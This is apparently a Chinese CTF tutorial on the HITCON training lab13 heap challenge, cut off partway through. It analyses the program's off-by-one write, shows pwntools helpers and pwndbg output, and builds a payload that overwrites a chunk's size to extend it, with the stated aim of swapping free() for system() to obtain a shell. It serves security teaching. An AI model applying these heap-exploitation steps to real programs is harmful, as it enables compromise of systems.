> 例题及源码下载：
>
> [https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13)
>
> **<font style="color:#F5222D;">十分感谢hollk师傅的文章：</font>**[https://blog.csdn.net/qq_41202237/article/details/108320408](https://blog.csdn.net/qq_41202237/article/details/108320408)
>
> 文章中出现了与hollk师傅不一样的堆状况（free之后重新malloc会新建一个堆），为了讲解清楚，后半部分的图片以及思路全部来自hollk师傅的CSDN，这里特别感谢。
>
> （PS：这并不影响exp的执行结果）
>

# 检查文件的保护情况
将文件下载下来，检查一下可执行文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600251878121-67351376-312a-40c5-a0b1-e77e83fd760c.png)

64位程序，开启了Canary保护和NX保护

# 执行程序
## 主界面
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600252097626-9dda7259-cdcc-40f7-a8bc-8a01a77d027d.png)

+ 1、创建一个堆
+ 2、对堆进行编辑
+ 3、打印一个堆的内容
+ 4、删除一个堆
+ 5、退出

## 第一个功能--创建一个堆
在程序中输入1以创建一个堆：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600253540937-2eede7e5-8613-421c-8d51-cddc0fa84e34.png)

再创建一个堆：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600253595420-29ec015c-1ce6-47ac-a35d-4449aa31ab03.png)

## 第二个功能--编辑一个堆
输入2以执行此功能：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600253631680-8d35687d-52e1-413d-be03-3b4245dac9a2.png)

从上面的图可以看到，首先程序让我们输入堆的序列，根据这个序列来编辑对应堆的内容。

> 注意：堆的序列是从0开始的
>

## 第三个功能--打印一个堆
输入堆的序列以打印：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600254722892-05f1b07a-1d44-4d9f-86f8-165d9328736a.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600252920617-46fffac0-adbb-444c-8dce-ce209dc4fb88.png)

## 第四个功能--删除一个堆
输入堆的序列以删除，我们删除第二个堆

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600253063552-0878266e-6d0e-4b7b-acb0-6a6a49eaa38c.png)

然后执行功能3查看一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600254768832-a7ca47ee-295f-4b54-876d-a98bbd25e7a8.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600254793884-525b5587-c706-482c-9b6e-b1cb312c491b.png)

可以看到创建的第二个堆已经删除。

# 查看源代码
由于有程序的源代码，因此就不看IDA中的伪代码了。

源代码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void read_input(char *buf,size_t size){
	int ret ;
    ret = read(0,buf,size);
    if(ret <=0){
        puts("Error");
        _exit(-1);
    }	
}

struct heap {
	size_t size ;
	char *content ;
};

struct heap *heaparray[10];

void menu(){
	puts("--------------------------------");
	puts("          Heap Creator          ");
	puts("--------------------------------");
	puts(" 1. Create a Heap               ");
	puts(" 2. Edit a Heap                 ");
	puts(" 3. Show a Heap                 ");
	puts(" 4. Delete a Heap               ");
	puts(" 5. Exit                        ");
	puts("--------------------------------");
	printf("Your choice :");
}

void create_heap(){
	int i ;
	char buf[8];
	size_t size = 0;
	for(i = 0 ; i < 10 ; i++){
		if(!heaparray[i]){
			heaparray[i] = (struct heap *)malloc(sizeof(struct heap));
			if(!heaparray[i]){
				puts("Allocate Error");
				exit(1);
			}
			printf("Size of Heap : ");
			read(0,buf,8);
			size = atoi(buf);
			heaparray[i]->content = (char *)malloc(size);
			if(!heaparray[i]->content){
				puts("Allocate Error");
				exit(2);
			}
			heaparray[i]->size = size ;
			printf("Content of heap:");
			read_input(heaparray[i]->content,size);
			puts("SuccessFul");
			break ;
		}
	}
}

void edit_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){
		printf("Content of heap : ");
		read_input(heaparray[idx]->content,heaparray[idx]->size+1);
		puts("Done !");
	}else{
		puts("No such heap !");
	}
}

void show_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){
		printf("Size : %ld\nContent : %s\n",heaparray[idx]->size,heaparray[idx]->content);
		puts("Done !");
	}else{
		puts("No such heap !");
	}

}

void delete_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){
		free(heaparray[idx]->content);
		free(heaparray[idx]);
		heaparray[idx] = NULL ;
		puts("Done !");	
	}else{
		puts("No such heap !");
	}

}


int main(){
	char buf[4];
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	while(1){
		menu();
		read(0,buf,4);
		switch(atoi(buf)){
			case 1 :
				create_heap();
				break ;
			case 2 :
				edit_heap();
				break ;
			case 3 :
				show_heap();
				break ;
			case 4 :
				delete_heap();
				break ;
			case 5 :
				exit(0);
				break ;
			default :
				puts("Invalid Choice");
				break;
		}

	}
	return 0 ;
}
```

接下来对每个函数进行分析

## 分析struct结构体
```c
struct heap {
	size_t size ;   //堆块的大小，size成员变量占8个字节
	char *content ; //堆块的指针，指向堆块的内容
};

struct heap *heaparray[10]; //堆块序列的指针，指向heaparray数组，从0开始，最多创建11个堆
```

## 分析main函数
```c
int main(){
	char buf[4];
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	while(1){
		menu();
		read(0,buf,4);
		switch(atoi(buf)){
			case 1 :
				create_heap();
				break ;
			case 2 :
				edit_heap();
				break ;
			case 3 :
				show_heap();
				break ;
			case 4 :
				delete_heap();
				break ;
			case 5 :
				exit(0);
				break ;
			default :
				puts("Invalid Choice");
				break;
		}

	}
	return 0 ;
}
```

main函数主要是对程序流程的控制，相当于程序的主界面。

代码使用switch case语句进行控制，这里不再细说。

## 分析创建堆块代码
对代码进行注释：

```c
void create_heap(){
	int i ;
	char buf[8];
	size_t size = 0;
	for(i = 0 ; i < 10 ; i++){  //大循环，最多循环10次
		if(!heaparray[i]){ //根据heaparray数组来判断是否创建了结构体
            //若未创建heap结构体，开始分配堆空间
			heaparray[i] = (struct heap *)malloc(sizeof(struct heap));
			if(!heaparray[i]){
               //分配堆空间失败
				puts("Allocate Error");
				exit(1);
			}
            //若已创建heap结构体
			printf("Size of Heap : ");
			read(0,buf,8);//输入堆大小
			size = atoi(buf);
			heaparray[i]->content = (char *)malloc(size);
            //根据输入的堆大小进行malloc
            //让结构体变量成员content指向size大小的堆块
			if(!heaparray[i]->content){
                //若content创建失败
				puts("Allocate Error");
				exit(2);
			}
            //若context创建成功，将输入的size赋值到结构体变量的size中
			heaparray[i]->size = size ;
			printf("Content of heap:");
			read_input(heaparray[i]->content,size);//调用read_input函数输入heap的内容
			puts("SuccessFul");
			break ;
		}
	}
}
```

自动化payload如下:

```python
def create(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)
```

## 分析编辑堆块代码
```c
void edit_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);//输入堆的序列号
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){//判断序列号的正确性
		puts("Out of bound!");
		_exit(0);
	}
  //若序列号正确
	if(heaparray[idx]){
		printf("Content of heap : ");
		read_input(heaparray[idx]->content,heaparray[idx]->size+1);
    //调用read_input函数输入堆的内容
		puts("Done !");
	}else{
		puts("No such heap !");
	}
}
```

自动化payload如下:

```python
def edit(idx, content):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))
    p.recvuntil(":")
    p.sendline(content)
```

## 分析打印堆块代码
```c
void show_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);//输入堆块的index
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){//根据序列进行查找
        //打印指定堆块内容
		printf("Size : %ld\nContent : %s\n",heaparray[idx]->size,heaparray[idx]->content);
		puts("Done !");
	}else{
		puts("No such heap !");
	}

}
```

自动化payload如下:

```python
def show(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))
```

## 分析删除堆块代码
```c
void delete_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);//输入index
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){//判断堆块序列的合法性
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){
		free(heaparray[idx]->content);//free content指针
		free(heaparray[idx]);//free heaparray[idx]指针
		heaparray[idx] = NULL ;//指针置空
		puts("Done !");	
	}else{
		puts("No such heap !");
	}

}
```

> 值得注意的是:在释放content的时候是将内容结构体指针作为free函数参数的
>

自动化payload如下:

```python
def delete(idx):
    p.recvuntil(":")
    p.sendline("4")
    p.recvuntil(":")
    p.sendline(str(idx))
```

# pwngdb调试
gdb调试一下程序，录入两个堆的信息。详细信息如下：

```bash
➜  heapcreator_data gdb heapcreator
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from heapcreator...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/heapcreator_data/heapcreator 
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :1
Size of Heap : 200
Content of heap:heap1_content
SuccessFul
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :1
Size of Heap : 250
Content of heap:heap2_content           
SuccessFul
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :

```

ctrl+c进入调试命令，查看一下堆的结构,堆是从0x603000开始的

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600326634738-2c258139-6f44-4711-97b9-145e657ddcd4.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600258007510-fc2b387f-376e-4b83-8867-3ba1d7924d19.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600326923613-be07d1d9-0d58-4b11-92ed-e3541dc8a2a1.png)

> **<font style="color:#F5222D;">注:上面的堆块内容指的是第一次创建的堆块</font>**
>

**<font style="color:#F5222D;">从上图中可以看到heap结构体和堆块的内容是连接在一起的。</font>**

**<font style="color:#F5222D;">不知道在上面分析源代码的时候是否注意到了off-by-one漏洞?</font>**

• 创建堆块：read_input(heaparray[i]->content,size);

• 修改堆块：read_input(heaparray[idx]->content,heaparray[idx]->size+1);

可以看到修改堆块的代码有变化,在创建堆块时仅仅写入了size字节的内容,但是修改就写入了size+1的内容,这就造成了off-by-one的漏洞

假设我们创建的时候写入的大小为32字节,那么修改时是对堆中写入了33个字节,不要小看这一个字节，它溢出覆盖的位置正好是下一个堆块的size部分！！！

程序的内存布局如下:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600327636822-0601b6d2-5926-4e5b-a7a4-d3c0f16bc350.png)

再来看一下输入堆块内容的地址:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600327968734-c2ef4e32-6e7b-41e9-a6ea-4621b1492ae0.png)

可以看到,第一个堆块的内容地址为0x603030,第二个堆块内容的为0x603120

由第一个堆块的起始地址我们可以得到第二个堆块的结构体地址:0x6030f0

查看一下第二个堆块的内容和结构体:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600328514209-a27f4639-9677-4fc2-ba27-ab87f9fb8182.png)

> top_chunk的地址为0x603220:	0x0000000000000000	0x0000000000020de1
>

heap1结构体和内容与heap2结构体和内容相似,这里不再多说.

## 触发off-by-one漏洞完成Extend
从上面可以知道,我们创建的两个结构体的content成员变量都指向内容chunk的data,但是我们怎么利用这个off-by-one的漏洞呢?

这里借用一下@hollk师傅的图:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600328899947-aa579dea-034d-40d2-8d40-10068f360161.png)

+ 先从浅层看这个问题，我们修改的其实是heap内容的chunk而不是结构体本身的chunk，也就是说如果我们修改heap1的内容，如果触发off-by-one的话那影响的应该是heap2的结构体
+ **<font style="color:#F5222D;">再从深层看这个问题，在堆中如果低地址的块处于使用状态，那么相邻高地址的块的pre_size可以作为低地址块的data来使用</font>**

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600329002654-98718dec-7cd8-4004-a684-bea0e8ef96a9.png)

> 来自文章:[https://www.yuque.com/cyberangel/rg9gdm/uhdudz](https://www.yuque.com/cyberangel/rg9gdm/uhdudz)
>

把两个方面联系在一起：如果我们在申请heap_content的大小的时候范围涵盖下一个结构体的prev_size，那么在此修改heap_content的时候就会触发off-by-one漏洞，进而溢出的部分就会将相邻高地址的chunk的size给覆盖掉

试一下吧,重新使用gdb打开程序,创建的堆信息如下:

+ 第一个堆:heap创建24个字节,并写入任意字符
+ 第二个堆:heap创建16个字节,并写入任意字符

```powershell
➜  heapcreator_data gdb heapcreator
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from heapcreator...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/heapcreator_data/heapcreator 
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :1
Size of Heap : 24
Content of heap:aaaaaaaaaaaaaaaaaaaaaaaa
SuccessFul
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :Invalid Choice
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :1
Size of Heap : 16
Content of heap:b
SuccessFul
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x0
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x4
 RDI  0x0
 RSI  0x7fffffffddc0 —▸ 0x7fffffff0a31 ◂— 0x0
 R8   0x7ffff7fde700 ◂— 0x7ffff7fde700
 R9   0xd
 R10  0x0
 R11  0x246
 R12  0x400750 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdeb0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddd0 —▸ 0x400e00 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffddb8 —▸ 0x400d96 (main+115) ◂— lea    rax, [rbp - 0x10]
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
─────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffddb8 —▸ 0x400d96 (main+115) ◂— lea    rax, [rbp - 0x10]
01:0008│ rsi  0x7fffffffddc0 —▸ 0x7fffffff0a31 ◂— 0x0
02:0010│      0x7fffffffddc8 ◂— 0xed4b55b848086000
03:0018│ rbp  0x7fffffffddd0 —▸ 0x400e00 (__libc_csu_init) ◂— push   r15
04:0020│      0x7fffffffddd8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
05:0028│      0x7fffffffdde0 ◂— 0x1
06:0030│      0x7fffffffdde8 —▸ 0x7fffffffdeb8 —▸ 0x7fffffffe23a ◂— '/home/ubuntu/Desktop/heapcreator_data/heapcreator'
07:0038│      0x7fffffffddf0 ◂— 0x1f7ffcca0
───────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1           400d96 main+115
   f 2     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

ctrl+c进入调试,查看堆的状况:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600331762940-970611e0-391f-497c-aca7-347bb5c94ef4.png)

查看堆的情况:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600331875929-3f2143e8-3f9b-4280-a482-f06f0a78ec95.png)

可以看到heap1_content输入24个字节之后将heap2结构体chunk的pre_size占满了，如果我们在修改一下heap1_content,将其写入25个字节后就会触发off-by-one漏洞将heap2结构体chunk的size覆盖掉。

试一下，输入c回到程序的执行流程，输入2修改heap1_content写入25个字节：aaaaaaaaaaaaaaaaaaaaaaaac

然后ctrl+c回到调试界面重新回到这个位置，详细信息如下：

```powershell
pwndbg> c
Continuing.
3
Index :0 
Size : 24
Content : aaaaaaaaaaaaaaaaaaaaaaaa!
Done !
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :2
Index :0
Content of heap : aaaaaaaaaaaaaaaaaaaaaaaac
Done !
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :Invalid Choice
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────[ REGISTERS ]───────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x0
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x4
 RDI  0x0
 RSI  0x7fffffffddc0 —▸ 0x7fffffff0a0a ◂— 0x0
 R8   0x7ffff7fde700 ◂— 0x7ffff7fde700
 R9   0xd
 R10  0x0
 R11  0x246
 R12  0x400750 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdeb0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddd0 —▸ 0x400e00 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffddb8 —▸ 0x400d96 (main+115) ◂— lea    rax, [rbp - 0x10]
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
────────────────────────────────[ DISASM ]────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ rsp  0x7fffffffddb8 —▸ 0x400d96 (main+115) ◂— lea    rax, [rbp - 0x10]
01:0008│ rsi  0x7fffffffddc0 —▸ 0x7fffffff0a0a ◂— 0x0
02:0010│      0x7fffffffddc8 ◂— 0xed4b55b848086000
03:0018│ rbp  0x7fffffffddd0 —▸ 0x400e00 (__libc_csu_init) ◂— push   r15
04:0020│      0x7fffffffddd8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
05:0028│      0x7fffffffdde0 ◂— 0x1
06:0030│      0x7fffffffdde8 —▸ 0x7fffffffdeb8 —▸ 0x7fffffffe23a ◂— '/home/ubuntu/Desktop/heapcreator_data/heapcreator'
07:0038│      0x7fffffffddf0 ◂— 0x1f7ffcca0
──────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1           400d96 main+115
   f 2     7ffff7a2d840 __libc_start_main+240
──────────────────────────────────────────────────────────────────────────
pwndbg> 
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600332412755-67cff4aa-b822-431c-ad91-4cef552fdcc6.png)

可以看到原有的heap2结构体的size从0x21被覆盖成了0x63，heap2结构体的size直接决定了heap2结构体涵盖范围的大小，这里就用到了上一篇文章讲原理部分的内容了，即对 inuse 的 fastbin 进行 extend（如果忘记了可以回顾一下）。那么既然我们可以通过这种方式改写size大小，就要好好设计一番了。

**<font style="color:#F5222D;">如果我们将size的值覆盖成0x41的话，在释放时heap2结构体chunk和heap2_content就会合并成一个0x40的块</font>**，重新申请之后就可以进一步操作了，先想好：

```python
payload1.0 = 24个字节 + \x41
```

其实前面的24个字节还是可以利用起来的，**<font style="color:#F5222D;">在代码分析阶段我们发现在释放heap的时候首先释放的是heap_content的指针，这个指针指向的其实是heap_content的chunk中的data起始地址，这个过程是由free()函数完成的，free()函数的参数就是heap_content的data起始地址。那么如果我么想办法将free()函数替换成system()函数，并且在修改堆块内容的时候将字符串/bin/sh放在最前面，那么/bin/sh字符串的地址就会作为free函数的参数，即/bin/sh字符串会作为system()函数的参数，在释放这个堆块的时候就可以拿shell了！！！</font>**

```python
payload2.0 = "/bin/sh\x00" + "aaaaaaaaaaaaaaaa" + "\x41"
```



![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600333169340-cd7aa918-ec9d-45a2-bd60-0c491cbb252c.png)

我们在pwngdb中可以执行命令：**<font style="color:#F5222D;">set *0x603030=0x6E69622F;</font>****<font style="color:#F5222D;">set *0x603034=0x0068732F</font>**

**<font style="color:#F5222D;">执行效果如下：</font>**

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600333777667-45329515-7dc8-42f8-8685-fc3ebc02b2fa.png)

**<font style="color:#F5222D;">在设置</font>**"\x41"：set *0x603048=0x41，效果如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600333962289-afadae90-8ab6-4c0c-81d9-9632a153e504.png)

可以看到已经成功的部署好了"/bin/sh"字符串，并且将下一个heap2的size部分覆盖成了0x41。接下来的操作就和前面的原理一样了，我们需要释放掉heap2，也就是释放编号为1的heap。按c回到执行流程删除编号为1的heap，Ctrl + c回到调试界面输入命令bin我们看一下释放后的堆块放在哪了：

```powershell
pwndbg> c
Continuing.
4
Index :1
Done !
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Show a Heap                 
 4. Delete a Heap               
 5. Exit                        
--------------------------------
Your choice :^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────[ REGISTERS ]───────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x0
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x4
 RDI  0x0
 RSI  0x7fffffffddc0 —▸ 0x7fffffff0a34 ◂— 0x0
 R8   0x7ffff7fde700 ◂— 0x7ffff7fde700
 R9   0xd
*R10  0x8b8
 R11  0x246
 R12  0x400750 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdeb0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddd0 —▸ 0x400e00 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffddb8 —▸ 0x400d96 (main+115) ◂— lea    rax, [rbp - 0x10]
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
────────────────────────────────[ DISASM ]────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ rsp  0x7fffffffddb8 —▸ 0x400d96 (main+115) ◂— lea    rax, [rbp - 0x10]
01:0008│ rsi  0x7fffffffddc0 —▸ 0x7fffffff0a34 ◂— 0x0
02:0010│      0x7fffffffddc8 ◂— 0xed4b55b848086000
03:0018│ rbp  0x7fffffffddd0 —▸ 0x400e00 (__libc_csu_init) ◂— push   r15
04:0020│      0x7fffffffddd8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
05:0028│      0x7fffffffdde0 ◂— 0x1
06:0030│      0x7fffffffdde8 —▸ 0x7fffffffdeb8 —▸ 0x7fffffffe23a ◂— '/home/ubuntu/Desktop/heapcreator_data/heapcreator'
07:0038│      0x7fffffffddf0 ◂— 0x1f7ffcca0
──────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1           400d96 main+115
   f 2     7ffff7a2d840 __libc_start_main+240
──────────────────────────────────────────────────────────────────────────
pwndbg> 
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600334487745-c156be18-8f5c-49c9-8bda-4750ba7d2dc4.png)

可以看到在是防止后fastbin中已经出现了两个chunk地址了，首先释放的应该是heap_content，接着释放的是heap结构体，所以会在fastbin中存在两个chunk地址。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600334714617-7af20ba2-2779-4f62-823f-c44ccfa9d479.png)

由于我们对heap2结构体范围进行了扩展，因此heap结构体chunk与heap内容chunk合并了，当我们再次申请的时候就可以对extend的chunk进行操作了。

## 泄露free()函数真实地址
通过前面的努力我们已经完成了如下步骤：

+ 将"/bin/sh"字符串部署在heap1内容chunk的data处
+ 通过off-by-one漏洞完成修改heap2结构体chunk的size值
+ 成功extend heap2结构体chunk

